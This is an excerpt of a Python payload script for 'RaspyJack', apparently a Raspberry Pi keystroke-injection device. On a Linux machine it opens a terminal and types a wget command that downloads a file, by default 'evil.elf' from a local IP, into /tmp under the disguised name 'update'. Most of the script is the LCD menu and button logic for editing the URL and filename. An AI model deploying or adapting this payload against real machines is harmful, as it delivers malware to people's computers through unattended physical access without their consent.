...
"""
RaspyJack *payload* – **HID Attack: Download File (Linux)**
===========================================================
A HID attack that opens a terminal on a Linux machine and uses `wget`
...
# --- CONFIGURATION ---
FILE_URL = "http://192.168.1.100/evil.elf" # Will be configurable
OUTPUT_FILENAME = "update" # Will be configurable
...
# --- Globals & Shutdown ---
running = True
current_url_input = FILE_URL # For URL input
url_input_cursor_pos = 0
current_filename_input = OUTPUT_FILENAME # For filename input
filename_input_cursor_pos = 0
...
def draw_ui(screen_state="main"):
    ...
    d.text((5, 5), "Linux Download File", font=FONT_TITLE, fill="#00FF00")
    d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)
    
    if screen_state == "main":
        d.text((5, 30), "File URL:", font=FONT, fill="white")
        d.text((5, 45), FILE_URL[:16] + "...", font=FONT_TITLE, fill="yellow")
        d.text((5, 65), "Output Filename:", font=FONT, fill="white")
        d.text((5, 80), OUTPUT_FILENAME[:16], font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "OK=Start | KEY1=Edit URL | KEY2=Edit Name | KEY3=Exit", font=FONT, fill="cyan")
    elif screen_state == "url_input":
        d.text((5, 30), "Enter File URL:", font=FONT, fill="white")
    ...
    elif screen_state == "filename_input":
        d.text((5, 30), "Enter Filename:", font=FONT, fill="white")
        display_filename = list(current_filename_input)
        if filename_input_cursor_pos < len(display_filename):
            display_filename[filename_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_filename[:16]), font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "UP/DOWN=Char | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill="cyan")
    elif screen_state == "attacking":
        d.text((5, 50), "Injecting Wget...", font=FONT_TITLE, fill="yellow")
        d.text((5, 70), f"URL: {FILE_URL[:16]}...", font=FONT, fill="white")
...
def handle_text_input_logic(initial_text, screen_state_name, char_set):
    global current_url_input, url_input_cursor_pos, current_filename_input, filename_input_cursor_pos
    
    if screen_state_name == "url_input":
        current_input_ref = current_url_input
        cursor_pos_ref = url_input_cursor_pos
    else: # filename_input
        current_input_ref = current_filename_input
        cursor_pos_ref = filename_input_cursor_pos
...
# --- Main Attack Logic ---
def run_attack():
    global FILE_URL, OUTPUT_FILENAME
    ...
    command = f"wget -O /tmp/{OUTPUT_FILENAME} {FILE_URL}"
    ...
    try:
        ...
        time.sleep(0.75)
        hid_helper.type_string(command)
...
if __name__ == '__main__':
    if not HARDWARE_LIBS_AVAILABLE:
        print("ERROR: Hardware libraries (RPi.GPIO, LCD drivers, PIL) are not available. Cannot run HID Download File.", file=sys.stderr)
        sys.exit(1)
    ...
    try:
        while running:
            if current_screen == "main":
                ...
                if GPIO.input(PINS["KEY1"]) == 0: # Edit File URL
                    current_url_input = FILE_URL
                    current_screen = "url_input"
                    time.sleep(0.3) # Debounce
                
                if GPIO.input(PINS["KEY2"]) == 0: # Edit Output Filename
                    current_filename_input = OUTPUT_FILENAME
                    current_screen = "filename_input"
                    time.sleep(0.3) # Debounce
            
            elif current_screen == "url_input":
                new_url = handle_text_input_logic(current_url_input, "url_input", "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-._~:/?#[]@!$&'()*+,;=%")
                if new_url:
                    FILE_URL = new_url
                current_screen = "main"
                time.sleep(0.3) # Debounce
            
            elif current_screen == "filename_input":
                new_filename = handle_text_input_logic(current_filename_input, "filename_input", "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-._")
                if new_filename:
        ...
        if HARDWARE_LIBS_AVAILABLE:
            LCD.LCD_Clear()
            GPIO.cleanup()
        print("HID Download File payload finished.")
